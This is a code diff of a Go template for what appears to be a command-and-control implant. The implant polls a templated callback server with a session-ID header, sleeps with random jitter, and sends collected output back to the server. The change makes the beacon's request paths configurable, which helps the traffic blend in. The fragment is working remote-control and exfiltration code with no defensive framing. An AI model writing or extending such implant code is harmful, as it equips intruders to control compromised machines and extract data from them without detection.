@@ -160,7 +160,7 @@ func main() {
 		jitter := rng.Intn({{.Jitter}}) + 1
 		sleepTime := {{.Sleep}} + jitter
 		
-		req, err := http.NewRequest("GET", "{{.CallBack}}/session", nil)
+		req, err := http.NewRequest("GET", "{{.CallBack}}/{{.GetURL}}", nil)
 		req.Header.Add("APPSESSIONID", uuid)
 		resp, err := client.Do(req)
 		body, err := io.ReadAll(resp.Body)
@@ -170,7 +170,7 @@ func main() {
 		if sb == "" {
 			for sb == "" { // An empty string represents a nil response body
 				time.Sleep(time.Duration(sleepTime) * time.Second)
-				req, err = http.NewRequest("GET", "{{.CallBack}}/session", nil)
+				req, err = http.NewRequest("GET", "{{.CallBack}}/{{.GetURL}}", nil)
 				req.Header.Add("APPSESSIONID", uuid)
 				resp, _ := client.Do(req)
 				body, _ := io.ReadAll(resp.Body)
@@ -194,7 +194,7 @@ func main() {
 
 		if err != nil {
 			time.Sleep(time.Duration(sleepTime) * time.Second)
-			req, _ = http.NewRequest("GET", "{{.CallBack}}/session", nil)
+			req, _ = http.NewRequest("GET", "{{.CallBack}}/{{.GetURL}}", nil)
 			req.Header.Add("APPSESSIONID", uuid)
 			resp, _ = client.Do(req)
 			body, _ := io.ReadAll(resp.Body)
@@ -279,7 +279,7 @@ func main() {
 		toSend = strings.Replace(toSend, "\n", "", -1)
 
 		time.Sleep(time.Duration(sleepTime) * time.Second)
-		req, err = http.NewRequest("GET", "{{.CallBack}}/schema", strings.NewReader(string(toSend)))
+		req, err = http.NewRequest("GET", "{{.CallBack}}/{{.PostURL}}", strings.NewReader(string(toSend)))
 		req.Header = http.Header{"APPSESSIONID": {uuid}}
 		resp, err = client.Do(req)
 		if err != nil {
